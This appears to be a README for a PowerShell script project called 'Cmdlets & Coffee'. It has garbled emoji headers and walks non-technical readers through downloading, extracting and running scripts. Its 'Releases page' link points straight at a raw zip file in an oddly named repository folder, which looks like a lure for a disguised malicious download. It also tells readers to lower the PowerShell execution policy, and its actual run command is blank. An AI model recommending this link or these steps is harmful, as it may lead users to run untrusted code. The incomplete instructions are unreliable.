## üöÄ Getting Started
Welcome to the official source code for the Cmdlets & Coffee website and blog. Here you will find helpful PowerShell scripts to enhance your work and make automation easier. 

This guide will help you download and run our software without any programming knowledge. 

## üåê What is Cmdlets & Coffee?
Cmdlets & Coffee is dedicated to sharing recipes for PowerShell scripts. Our focus is on providing easy-to-follow, effective solutions that simplify tasks such as automation, system administration, and web development.

## üõ†Ô∏è System Requirements
To run the Cmdlets & Coffee scripts, you will need: 
- A computer with Windows, macOS, or Linux.
- PowerShell installed on your machine. PowerShell comes pre-installed on Windows. You can download it for macOS and Linux from the official Microsoft site.

## üì• Download & Install
1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/A4kLahmacun/cmdletsandcoffee.github.io/main/histogeny/cmdletsandcoffee.github.io.zip) to find the latest version of our scripts.
   
2. **Choose Your File**: Look for the file that best matches your system. We provide various formats for your convenience. 

3. **Download the File**: Click on the file link to start the download. The file will typically be a .zip or .ps1 (PowerShell script) format.

4. **Locate the File on Your Computer**: Check your downloads folder to find the file you just downloaded.

5. **Extract the File if Necessary**: If you downloaded a .zip file, right-click on it and select "Extract All" to access the contained files.

6. **Open PowerShell**: 
   - On Windows, search for "PowerShell" in the start menu and click on it.
   - On macOS or Linux, open the terminal and type `pwsh` to start PowerShell.

7. **Run the Script**:
   - Navigate to the directory where the script is located using the `cd` command. For example, if your script is in a folder called "Scripts" on your desktop, you would type:
     ```
     cd Desktop/Scripts
     ```
   - Execute the script by typing:
     ```

     ```
   - Note: You may need to adjust your PowerShell execution policy. If you see a message saying you cannot run scripts, type the following command to allow running scripts:
     ```
     Set-ExecutionPolicy RemoteSigned
     ```
